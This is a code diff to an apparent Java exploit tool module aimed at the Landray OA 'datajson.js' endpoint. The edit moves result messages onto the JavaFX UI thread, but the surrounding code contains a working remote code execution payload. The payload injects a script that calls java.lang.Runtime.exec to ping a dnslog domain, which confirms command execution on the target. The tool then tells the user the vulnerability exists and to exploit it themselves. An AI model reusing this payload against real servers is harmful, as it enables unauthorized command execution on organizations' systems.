@@ -2,6 +2,7 @@ package exp.oa.landrayoa;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -25,10 +26,14 @@ public class landray_datajson implements Exploitlnterface {
         String payload = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20" + shell.getRandomString() + "." + dnslog+"%22)&type=1";
         Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");
         if(response.getCode() == 200 && response.getText().contains("success")){
-            textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
+            Platform.runLater(()->{
+              textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
+            });
             return true;
         }else {
-            textArea.appendText("\n landray_datajson-RCE-漏洞不存在 (出现误报请联系作者)");
+           Platform.runLater(()->{
+              textArea.appendText("\n landray_datajson-RCE-漏洞不存在 (出现误报请联系作者)");
+           });
             return false;
         }
 
